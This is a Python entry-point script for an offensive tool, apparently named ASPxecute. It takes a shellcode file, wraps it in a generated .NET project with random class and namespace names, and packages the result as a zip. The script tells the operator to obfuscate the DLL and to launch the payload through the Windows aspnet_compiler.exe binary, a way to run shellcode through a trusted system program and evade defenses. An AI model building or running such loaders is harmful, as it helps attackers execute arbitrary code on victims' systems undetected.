import os
from src.cli import parse_args
from src.misc import banner, generate_random_word
from src.aspexecutor import ASPxecute
from src.consts import BUILD_DIR

def main():
    banner()
    args = parse_args()

    shellcode = os.path.abspath(args.shellcode)
    classname = args.classname
    namespace = args.namespace
    extension = args.extension

    # Generate Class Name and NameSpace if it is none
    if (not classname):
        classname = generate_random_word()

    if (not namespace):
        namespace = generate_random_word()

    print("[+] Using shellcode file: ", shellcode)
    print("[+] Using class name:     ", classname)
    print("[+] Using namespace:      ", namespace)
    print("[+] Using extension:      ", extension)
    print()

    # Generate stuff
    aspexecute = ASPxecute(shellcode, namespace, classname, extension)
    aspexecute.validate()
    aspexecute.template()
    aspexecute.generate_payload()
    aspexecute.zip_directory(
        os.path.join(aspexecute.tempdir, "output"),
        os.path.join(BUILD_DIR, f"{aspexecute.namespace}.zip")
    )

    print("\n[+] Build Complete")
    print(f"[+] Feel free to Obfuscate {aspexecute.namespace}\\bin\\{aspexecute.namespace}.dll")
    print("[+] When you are ready, unzip the payload and run the following command from the base directory:\n\n\tC:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\aspnet_compiler.exe -v none -p . -f .\\none -u\n")
    print("[+] Ciao")

if __name__ == "__main__":
    main()
